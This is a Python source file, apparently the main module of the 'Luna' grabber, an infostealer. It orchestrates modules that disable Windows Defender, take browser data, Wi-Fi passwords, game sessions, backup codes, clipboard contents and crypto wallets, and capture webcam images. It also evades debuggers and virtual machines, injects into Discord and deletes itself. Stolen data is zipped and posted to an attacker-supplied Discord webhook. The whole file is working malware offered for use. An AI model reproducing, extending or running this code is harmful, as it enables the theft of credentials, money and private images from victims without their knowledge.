import concurrent.futures
import json
import os
import random
import requests
import sys
from multiprocessing import cpu_count
from requests_toolbelt.multipart.encoder import MultipartEncoder
from zipfile import ZIP_DEFLATED, ZipFile


#global variables
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")


def main(webhook: str):
    threads = []

    if __CONFIG__["fakeerror"]:
        threads.append(fakeerror)
    if __CONFIG__["startup"]:
        threads.append(startup)
    if __CONFIG__["defender"]:
        threads.append(disable_defender)
    if __CONFIG__["browser"]:
        threads.append(Browsers)
    if __CONFIG__["wifi"]:
        threads.append(Wifi)
    if __CONFIG__["minecraft"]:
        threads.append(Minecraft)
    if __CONFIG__["backupcodes"]:
        threads.append(BackupCodes)
    if __CONFIG__["clipboard"]:
        threads.append(Clipboard)
    if __CONFIG__["webcam"]:
        threads.append(capture_images)
    if __CONFIG__["wallets"]:
        threads.append(steal_wallets)
    if __CONFIG__["games"]:
        threads.append(Games)


    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
        executor.map(lambda func: func(), threads)

    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    for dirname, _, files in os.walk(temp_path):
        for filename in files:
            absname = os.path.join(dirname, filename)
            arcname = os.path.relpath(absname, temp_path)
            zipped_file.write(absname, arcname)
    zipped_file.close()

    data = {
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
    }

    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'

    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})

    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard", "webcam", "wallets", "games"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(webhook, json=data)

    if __CONFIG__["systeminfo"]:
        PcInfo()

    if __CONFIG__["discord"]:
        Discord()

    os.remove(_file)


def Luna(webhook: str):
    def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
        try:
            return requests.get("https://gstatic.com/generate_204").status_code == 204
        except Exception:
            return False
    if not IsConnectedToInternet():
        sys.exit(0)

    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        if __CONFIG__["injection"]:
            executor.submit(Injection, webhook)
        executor.submit(main, webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()



# Options get put here
